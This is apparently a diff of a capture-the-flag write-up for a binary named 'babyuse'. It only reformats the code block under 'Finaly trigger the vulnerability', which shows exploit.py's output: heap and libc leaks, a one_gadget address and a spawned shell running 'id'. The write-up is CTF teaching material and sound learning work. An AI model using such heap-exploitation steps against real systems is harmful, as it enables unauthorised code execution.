@@ -192,15 +192,15 @@
 	```
 ### IV. Finaly trigger the vulnerability
 
-	```
-	./exploit.py 
-	[+] Starting local process './babyuse': pid 41084
-	Heap Leak: 0x5655ea20
-	Libc Leak: 0xf7e3f7b0
-	Libc Base: 0xf7c8d000
-	One_gadget 0xf7cc7c69
-	[*] Switching to interactive mode
-	$ 2
-	$ id
-	uid=1000(kevin) gid=1000(kevin) groups=1000(kevin),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
-	```
+```
+./exploit.py 
+[+] Starting local process './babyuse': pid 41084
+Heap Leak: 0x5655ea20
+Libc Leak: 0xf7e3f7b0
+Libc Base: 0xf7c8d000
+One_gadget 0xf7cc7c69
+[*] Switching to interactive mode
+$ 2
+$ id
+uid=1000(kevin) gid=1000(kevin) groups=1000(kevin),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+```
